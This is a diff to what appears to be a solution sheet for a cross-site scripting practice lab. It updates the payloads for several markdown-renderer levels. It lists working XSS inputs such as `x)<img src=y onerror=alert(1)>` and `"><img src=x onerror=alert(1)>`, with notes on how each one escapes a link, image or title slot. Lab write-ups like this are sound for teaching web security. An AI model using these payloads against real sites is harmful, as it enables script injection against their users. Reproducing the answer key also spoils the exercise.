@@ -4,17 +4,17 @@ Markdown renderer bugs: missing scheme checks, raw HTML pass-through, unescaped 
 
 ### markdown-level1
 
-`/markdown/level1/?url=javascript:alert(1)`
+`/markdown/level1/?url=x)%3Cimg%20src=y%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: markdown link url slot, no scheme check, `<a href="...">`
+- payload: `x)<img src=y onerror=alert(1)>`
+- context: link url slot stops at `)`; end the link and drop a raw tag into the body
 
 ### markdown-level2
 
-`/markdown/level2/?src=javascript:alert(1)`
+`/markdown/level2/?src=x)%3Cimg%20src=y%20onerror=alert(1)%3E`
 
-- payload: `javascript:alert(1)`
-- context: markdown image src, no scheme check (img onerror also works: `x" onerror=alert(1) x="`)
+- payload: `x)<img src=y onerror=alert(1)>`
+- context: image src slot stops at `)`; end the image and drop a raw tag into the body
 
 ### markdown-level3
 
@@ -39,7 +39,7 @@ Markdown renderer bugs: missing scheme checks, raw HTML pass-through, unescaped 
 
 ### markdown-level6
 
-`/markdown/level6/?title=x%22%20onload=alert(1)%20x=%22`
+`/markdown/level6/?title=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `x" onload=alert(1) x="`
-- context: markdown image title field reflected unescaped into `<img title="...">`
+- payload: `"><img src=x onerror=alert(1)>`
+- context: a `"` breaks the image regex, so the raw markdown line lands in the body
